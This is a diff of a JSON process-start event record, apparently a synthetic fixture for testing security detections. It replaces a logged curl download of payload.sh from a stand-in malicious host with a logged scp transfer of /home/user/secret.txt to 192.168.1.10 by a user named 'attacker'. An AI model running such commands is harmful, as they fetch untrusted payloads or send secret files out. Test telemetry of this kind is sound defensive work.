@@ -1,22 +1,23 @@
 {
-  "EventID": 1,
   "process": {
-    "name": "curl",
-    "pid": 45678,
-    "executable": "/usr/bin/curl",
-    "command_line": "curl -O http://malicious-server.com/payload.sh"
+    "name": "scp",
+    "pid": 12345,
+    "executable": "/usr/bin/scp",
+    "command_line": "scp -P 2222 /home/user/secret.txt user@192.168.1.10:/tmp/"
   },
   "host": {
     "name": "target-host"
   },
   "user": {
-    "name": "unauthorized-user",
-    "id": "1003"
+    "name": "attacker",
+    "id": "1001"
   },
   "destination": {
-    "ip": "203.0.113.50",
-    "port": 80
+    "ip": "192.168.1.10",
+    "port": 2222
   },
-  "@timestamp": "2025-03-26T13:15:30.456Z",
-  "message": "Process start detected: curl downloading file from http://malicious-server.com/payload.sh"
+  "@timestamp": "2025-03-26T14:20:45.678Z",
+  "EventID": 1,
+  "EventAction": "start",
+  "message": "Process start detected: scp transferring file to 192.168.1.10 on port 2222"
 }
